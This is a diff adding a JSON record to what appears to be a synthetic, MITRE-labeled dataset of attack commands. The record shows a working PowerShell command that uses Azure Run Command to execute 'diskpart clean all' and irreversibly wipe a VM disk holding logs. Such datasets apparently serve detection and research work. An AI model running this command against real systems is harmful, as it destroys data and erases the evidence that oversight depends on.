@@ -1,0 +1,21 @@
+{
+  "technique_id": "T1485",
+  "platform": "IaaS",
+  "shell": "PowerShell",
+  "command": "Invoke-AzVMRunCommand -ResourceGroupName 'RG-Logs' -Name 'WinVM-Logs' -CommandId 'RunPowerShellScript' -ScriptString \"$d=@('select disk 2','clean all'); $d | diskpart\"",
+  "explanation": "Uses diskpart clean all to overwrite every sector on the targeted Windows data disk (disk 2), irreversibly destroying its contents.",
+  "rationale_steps": [
+    "Target a non-OS data disk (disk 2) that holds specific logs.",
+    "Issue diskpart clean all to write zeros across the entire disk for complete data destruction."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1485-28d85ee8-5a2abfee",
+  "source_prompt_hash": "28d85ee8",
+  "timestamp_utc": "2025-09-30T08:03:27.709996Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
